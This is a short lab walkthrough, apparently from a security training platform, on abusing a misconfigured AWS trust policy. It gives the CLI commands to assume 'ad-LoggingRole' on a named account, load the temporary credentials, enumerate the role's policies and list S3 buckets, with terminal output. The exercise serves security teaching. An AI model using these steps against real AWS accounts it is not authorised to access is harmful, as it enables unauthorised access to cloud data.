# Misconfigured trust policy

Misconfigured trust policy can be leveraged to assume a role and perform privileged operations. 

Objective: Assume the role "ad-LoggingRole" on the AWS account "276384657722" and list the S3 buckets.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. Assume `ad-LoggingRole` role:

```text
aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging
```

4. Set access ` AWS_ACCESS_KEY_ID`, ` AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` in environment variables:
5. Check with:

```text
aws sts get-caller-identity
```

6. Get attached policies for `ad-LoggingRole`:

```text
aws iam list-attached-role-policies --role-name ad-LoggingRole
```

***The role has read access on the S3 and IAM service of the account.***

7. List s3 buckets:

```text
┌──(kali㉿kali)-[~]
└─$ aws s3 ls
2021-01-20 03:28:42 ad-secret-bucket-for-role
2021-03-14 14:10:17 attackdefense
...
```
